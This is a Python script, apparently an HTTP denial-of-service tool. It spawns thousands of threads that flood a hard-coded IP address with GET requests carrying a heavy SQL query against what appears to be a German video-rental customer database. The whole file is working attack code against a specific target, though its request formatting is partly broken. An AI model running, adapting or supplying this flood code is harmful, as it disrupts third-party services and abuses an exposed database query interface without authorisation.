from threading import Thread
from subprocess import call
from random import randint
import socket
import time

SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"

def execx():
	call(["./vcenter.sh", SQL_QUERY.format(randint(0, 2000))])

def httpDos():
	for i in range(0, 10):
		mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			mysocket.connect(("130.73.201.41", 80))
			mysocket.send("GET " + SQL_QUERY + "HTTP/1.1\r\n")
			mysocket.sendto("GET " + SQL_QUERY + "HTTP/1.1\r\n", ("130.73.201.41", 80))
		except socket.error:
			print("ERR ")
		mysocket.close()

t = []

for y in range(1, 10):
	for i in range(1,1000):
		#x = Thread(target=execx)
		x = Thread(target=httpDos)
		t.append(x)
		x.start()
	for x in t:
		x.join()

	print("1.000 Threads finished")


